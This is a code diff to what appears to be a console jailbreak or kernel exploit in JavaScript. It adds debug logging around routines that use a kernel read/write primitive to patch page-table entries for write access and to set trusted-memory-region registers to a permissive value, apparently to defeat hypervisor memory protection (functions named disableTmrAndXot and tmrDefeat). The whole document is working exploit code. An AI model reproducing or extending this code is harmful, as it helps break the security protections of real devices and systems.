@@ -76,7 +76,7 @@ async function uartLog(p, chain, msg) {
 // The DMAP page covering PA 0xF00C2xxx is mapped read-only — we patch the
 // PDE to add write access before TMR operations, then restore it.
 // ---------------------------------------------------------------------------
-async function ensureTmrWritable(krw, dmap, guestPml4VA, dmpml4i) {
+async function ensureTmrWritable(krw, dmap, guestPml4VA, dmpml4i, log) {
     var pa = TMR_INDIRECT_ADDR;
     var pdptIdx = (pa >>> 30) & 0x1FF;
     var pdIdx = (pa >>> 21) & 0x1FF;
@@ -88,11 +88,14 @@ async function ensureTmrWritable(krw, dmap, guestPml4VA, dmpml4i) {
     var pdpte = await krw.read8(pdptBase.add32(pdptIdx * 8));
     if (!(pdpte.low & PTE_PRESENT)) throw new Error("DMAP PDPTE not present for TMR");
 
+    log("PDPTE[" + pdptIdx + "]=0x" + pdpte.toString(16) + (pdpte.low & PTE_PS ? " 1G" : " 2M") + (pdpte.low & PTE_WRITE ? " W" : " RO"), LogLevel.LOG);
+
     if (pdpte.low & PTE_PS) {
         if (!(pdpte.low & PTE_WRITE)) {
             var entryAddr = pdptBase.add32(pdptIdx * 8);
             var patched = new int64((pdpte.low | PTE_WRITE) >>> 0, pdpte.hi);
             await krw.write8(entryAddr, patched);
+            log("Patched 1G PDPTE for write", LogLevel.LOG);
             return { addr: entryAddr, orig: pdpte };
         }
         return null;
@@ -102,10 +105,13 @@ async function ensureTmrWritable(krw, dmap, guestPml4VA, dmpml4i) {
     var pde = await krw.read8(pdBase.add32(pdIdx * 8));
     if (!(pde.low & PTE_PRESENT)) throw new Error("DMAP PDE not present for TMR");
 
+    log("PDE[" + pdIdx + "]=0x" + pde.toString(16) + (pde.low & PTE_WRITE ? " W" : " RO"), LogLevel.LOG);
+
     if (!(pde.low & PTE_WRITE)) {
         var entryAddr = pdBase.add32(pdIdx * 8);
         var patched = new int64((pde.low | PTE_WRITE) >>> 0, pde.hi);
         await krw.write8(entryAddr, patched);
+        log("Patched 2M PDE for write", LogLevel.LOG);
         return { addr: entryAddr, orig: pde };
     }
     return null;
@@ -129,16 +135,21 @@ async function tmrRelaxForPA(krw, dmap, pa, log) {
     var pa16 = (pa.hi << 16) | (pa.low >>> 16);
     var count = 0;
 
+    log("TMR scan pa16=0x" + (pa16 >>> 0).toString(16), LogLevel.LOG);
+
     for (var i = TMR_MAX - 1; i >= 0; i--) {
         if (i === 19 || i === 20) continue;
 
+        log("TMR[" + i + "] read...", LogLevel.LOG);
         var b = await tmrReadReg(krw, dmap, i * 0x10 + 0x00);
         var l = await tmrReadReg(krw, dmap, i * 0x10 + 0x04);
         var c = await tmrReadReg(krw, dmap, i * 0x10 + 0x08);
+        log("TMR[" + i + "] b=0x" + (b >>> 0).toString(16) + " l=0x" + (l >>> 0).toString(16) + " c=0x" + (c >>> 0).toString(16), LogLevel.LOG);
 
         if ((c & 1) === 0) continue;
         if ((pa16 >>> 0) < (b >>> 0) || (pa16 >>> 0) > (l >>> 0)) continue;
 
+        log("TMR[" + i + "] covers PA, writing permissive...", LogLevel.LOG);
         await tmrWriteReg(krw, dmap, i * 0x10 + 0x08, TMR_CFG_PERMISSIVE);
         var nc = await tmrReadReg(krw, dmap, i * 0x10 + 0x08);
         var ok = (nc === TMR_CFG_PERMISSIVE);
@@ -365,11 +376,16 @@ async function disableTmrAndXot(krw, chain, log, p) {
     var guestPml4VA = await krw.read8(pmapAddr.add32(OFFSET_KERNEL_PMAP_PM_PML4));
     if (guestPml4VA.low === 0 && guestPml4VA.hi === 0) throw new Error("Guest PML4 VA is 0");
 
-    var tmrPatch = await ensureTmrWritable(krw, dmap, guestPml4VA, dmpml4i);
+    var tmrPatch = await ensureTmrWritable(krw, dmap, guestPml4VA, dmpml4i, dlog);
     if (tmrPatch) {
-        await dlog("Patched TMR DMAP PDE for write access", LogLevel.LOG);
+        await dlog("PDE patched, flushing TLB", LogLevel.LOG);
         await chain.syscall(SYS_SCHED_YIELD);
+    } else {
+        await dlog("TMR DMAP page already writable", LogLevel.LOG);
     }
+
+    var testVal = await tmrReadReg(krw, dmap, 0x00);
+    await dlog("TMR test read: TMR[0].base=0x" + (testVal >>> 0).toString(16), LogLevel.LOG);
 
     await tmrDefeat(krw, dmap, dlog);
 
